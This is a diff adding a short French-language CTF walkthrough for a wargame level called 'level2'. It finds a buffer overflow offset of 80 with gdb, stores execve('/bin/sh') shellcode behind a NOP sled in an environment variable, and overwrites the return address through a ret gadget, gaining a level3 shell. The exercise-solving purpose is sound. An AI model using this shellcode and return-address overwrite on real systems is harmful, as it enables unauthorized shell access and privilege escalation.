@@ -1,0 +1,43 @@
+RET + SHELL CODE BUFFER ATTACK
+
+On utilise un pattern generator: https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+gdb level2
+r
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+register value: 0x37634136 == offset: 80
+
+Après plusieurs recherche en essayant de faire un bufferoverflow classique avec les variables déjà présente dans le binaire (system +/bin/bash) sans réussite
+On s'est orienté vers une shell code attack.
+
+Pour cela on a besoin de la fonction ret et du shell code suivant:
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+disas main:
+    0x0804853f <+0>:     push   %ebp
+    0x08048540 <+1>:     mov    %esp,%ebp
+    0x08048542 <+3>:     and    $0xfffffff0,%esp
+    0x08048545 <+6>:     call   0x80484d4 <p>
+    0x0804854a <+11>:    leave
+    0x0804854b <+12>:    ret
+
+disas p:
+    ...
+    0x0804853e <+106>:   ret
+    ...
+
+SHELL_CODE = export exploit=$(python -c 'print "\x90"*50 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+gdb level2
+b main
+r
+x/200xs environ
+    0xbffffec4:      "exploit=\220..."
+x/200xg 0xbffffec4
+prendre une NOP adresse au hasard:
+    0xbffffee4
+
+python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\xe4\xfe\xff\xbf"' | ./level2
+whoami
+    level3
